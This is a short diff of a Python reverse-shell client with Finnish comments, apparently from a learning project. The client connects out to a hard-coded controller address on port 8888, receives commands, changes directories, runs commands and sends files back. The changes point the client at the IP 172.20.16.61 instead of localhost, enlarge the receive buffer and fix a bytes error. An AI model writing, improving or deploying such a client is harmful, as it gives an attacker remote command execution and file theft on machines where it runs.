@@ -21,7 +21,7 @@ def download(s,command):
                 bits = f.read(1024)
             s.send(b'DONE')
     else:
-        s.send('File not found')
+        s.send(b'File not found')
 
 def vaihda_dirri(s,command):
     #splitataan välilyönneistä ja otetaan indeksi 1 talteen
@@ -47,14 +47,14 @@ def aja_komento(s,command):
 
 def main():
 
-    host_ip = '127.0.0.1' #172.20.16.62
+    host_ip = '172.20.16.61' #172.20.16.62
     port    = 8888
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host_ip, port))
 
     while True:
         #otetaan käsky talteen. 1kilotavu riittää. decodtaan bytet takaisin stringeiksi
-        command = s.recv(1024).decode('ISO-8859-1')
+        command = s.recv(4096).decode('ISO-8859-1')
         if command == 'exit':
             s.close()
             break
